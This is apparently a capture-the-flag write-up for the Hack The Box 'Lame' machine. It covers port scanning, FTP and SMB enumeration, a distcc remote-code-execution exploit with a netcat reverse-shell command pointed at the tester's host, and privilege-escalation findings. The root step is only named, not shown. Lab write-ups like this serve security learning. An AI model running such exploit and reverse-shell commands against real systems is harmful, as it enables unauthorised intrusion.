Box: Linux
Level: Easy
### Index
1. [Box Info](#Box%20Info)
2. [Initial Nmap Scan](#Initial%20Nmap%20Scan)
3. [FTP Enumeration](#FTP%20Enumeration)
4. [SMB Enumeration](#SMB%20Enumeration)
5. [DistcCC Daemon Exploit (CVE-2004-2687)](#DistcCC%20Daemon%20Exploit%20(CVE-2004-2687))
	1. [`User Flag`](#`User%20Flag`)
6. [Privilege Escalation](#Privilege%20Escalation)
	1. [`LinEnum Findings`](#`LinEnum%20Findings`)
### Box Info
```
Lame is an easy Linux machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.
```

### Initial Nmap Scan
```
# nmap -p- --min-rate=1000 -sC -sV -sT -T4 -A -Pn lame.htb                                                                               
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.8
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -15m45s, deviation: 2h49m43s, median: -2h15m46s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-09-21T22:35:12-04:00
```

### FTP Enumeration
Getting Anonymous access reveals nothing.
```
# ftp anonymous@10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> dir
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
226 Directory send OK.
................Along with this I tried few other commands as well and nothing was listing anything..................
ftp> put test.txt 
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||15394|).
553 Could not create file.
# No Write Access With anonymous user.
```

### SMB Enumeration
```
# smbmap  -H 10.10.10.3
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          

[+] IP: 10.10.10.3:445  Name: lame.htb                  Status: Authenticated
	Disk                                                    Permissions     Comment
	----                                                    -----------     -------
	print$                                                  NO ACCESS       Printer Drivers
	tmp                                                     READ, WRITE     oh noes!
	opt                                                     NO ACCESS
	IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
[*] Closed 1 connections                                                                                                     
```

We have READ/WRITE access on tmp share. Trying to push files on tmp but nothing happened.
### DistcCC Daemon Exploit (CVE-2004-2687)
`Use Python2 to run the exploit.` [CVE-2004-2687](https://github.com/angelpimentell/distcc_cve_2004-2687_exploit) Make sure to start the Listener on `Port 4444`
```
# python2 distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.8 4444 -e /bin/sh"
[OK] Connected to remote service
```
###### `User Flag`
```
daemon@lame:/home/makis$ cat user.txt
c80877d******************************
```

### Privilege Escalation 

###### `LinEnum Findings`
```
[-] Kernel information:
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
Linux version 2.6.24-16-server (buildd@palmer) (gcc version 4.2.3 (Ubuntu 4.2.3-2ubuntu7)) #1 SMP Thu Apr 10 13:58:00 UTC 2008

[-] Specific release information:
DISTRIB_DESCRIPTION="Ubuntu 8.04"

[+] We can sudo without supplying a password!
usage: sudo -h | -K | -k | -L | -l | -V | -v
usage: sudo [-bEHPS] [-p prompt] [-u username|#uid] [VAR=value]
            {-i | -s | <command>}
usage: sudo -e [-S] [-p prompt] [-u username|#uid] file ...

[+] Possible sudo pwnage!
file

[-] Accounts that have recently used sudo:
/home/makis/.sudo_as_admin_successful

[+] We can read root's home directory!
lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -> /dev/null
-rw-------  1 root root   33 Sep 21 22:29 root.txt
-rwx------  1 root root  401 May 20  2012 reset_logs.sh

[-] Sudo version:
Sudo version 1.6.9p10

[-] MYSQL version:
mysql  Ver 14.12 Distrib 5.0.51a, for debian-linux-gnu (i486) using readline 5.2

[+] We can connect to the local MYSQL service as 'root' and without a password!
mysqladmin  Ver 8.41 Distrib 5.0.51a, for debian-linux-gnu on i486
Copyright (C) 2000-2006 MySQL AB
This software comes with ABSOLUTELY NO WARRANTY. This is free software,
and you are welcome to modify and redistribute it under the GPL license

Server version          5.0.51a-3ubuntu5
Protocol version        10
Connection              Localhost via UNIX socket
UNIX socket             /var/run/mysqld/mysqld.sock
Uptime:                 2 hours 32 min 3 sec

Threads: 1  Questions: 438  Slow queries: 0  Opens: 419  Flush tables: 1  Open tables: 64  Queries per second avg: 0.048

[+] Possibly interesting SUID files:
-rwsr-xr-- 1 root dhcp 2960 Apr  2  2008 /lib/dhcp3-client/call-dhclient-script
-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap
```

###### `CVE-2007-2447`

This exploit was directly got me the root flag. But forgot to record it here.
